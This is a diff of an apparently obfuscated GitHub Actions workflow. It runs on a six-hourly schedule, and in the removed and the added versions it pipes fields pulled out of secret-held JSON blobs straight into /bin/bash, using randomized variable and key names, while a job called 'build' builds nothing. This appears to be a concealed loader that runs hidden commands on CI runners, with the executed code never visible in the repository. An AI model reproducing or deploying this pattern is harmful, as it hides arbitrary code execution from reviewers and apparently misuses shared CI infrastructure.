@@ -3,9 +3,9 @@ name: zhengjudian6715
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 4/6 * * *'
+    - cron: '39 1/6 * * *'
 
-jobs:  # 32495
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,24 +13,23 @@ jobs:  # 32495
       - uses: actions/checkout@v4
       - name: zhengjudian6715
         env:
-          k03: ${{ secrets.k03 }}
+          qr0325: ${{ secrets.qr0325 }}
         run: |
-          echo $k03 | jq -r .hjlzz73593 | /bin/bash
-          echo $q2675 | jq -r .mwqsu3088 | /bin/bash
-          echo $lwmn90 | jq -r .rbhqe54 | /bin/bash
-          echo $qi7407 | jq -r .ngufi478 | /bin/bash
-          echo $is1 | jq -r .w9042 | /bin/bash
-          echo $sycxw2080 | jq -r .iwser3 | /bin/bash
-          echo $ldw6553 | jq -r .mb41620 | /bin/bash
-          echo $agkma99802 | jq -r .s936 | /bin/bash
-          echo $tw613 | jq -r .m0771 | /bin/bash
-          echo $x378 | jq -r .uf18 | /bin/bash
-          echo $grgwe657 | jq -r .btwj8 | /bin/bash
-          echo $toej858 | jq -r .nsek24 | /bin/bash
-          echo $nituz69 | jq -r .rm27783 | /bin/bash
-          echo $tukz5412 | jq -r .zslpb90823 | /bin/bash
-          echo $taau951 | jq -r .mbmia4978 | /bin/bash
-          echo $cgf2835 | jq -r .o9646 | /bin/bash
-          echo $njsip4 | jq -r .uw91 | /bin/bash
-          echo $a52 | jq -r .uxns24663 | /bin/bash
+          echo $qr0325 | jq -r .eytw7 | /bin/bash
+          echo $pnk19 | jq -r .brjpu68499 | /bin/bash
+          echo $l851 | jq -r .owc127 | /bin/bash
+          echo $tryxp0 | jq -r .o38700 | /bin/bash
+          echo $jhxe63 | jq -r .lq662 | /bin/bash
+          echo $udiij8 | jq -r .ls6634 | /bin/bash
+          echo $jns92860 | jq -r .vjmhd288 | /bin/bash
+          echo $sgyeb28025 | jq -r .cec416 | /bin/bash
+          echo $cmiog06479 | jq -r .dtt400 | /bin/bash
+          echo $goc5209 | jq -r .sgt366 | /bin/bash
+          echo $aowz59 | jq -r .ubk1022 | /bin/bash
+          echo $klnzr9 | jq -r .l35540 | /bin/bash
+          echo $fgds10 | jq -r .rd507 | /bin/bash
+          echo $bjnqf24 | jq -r .wcd6 | /bin/bash
+          echo $l79450 | jq -r .tifo5 | /bin/bash
+          echo $n693 | jq -r .vf46746 | /bin/bash
+          echo $zxtx18549 | jq -r .d3 | /bin/bash
 
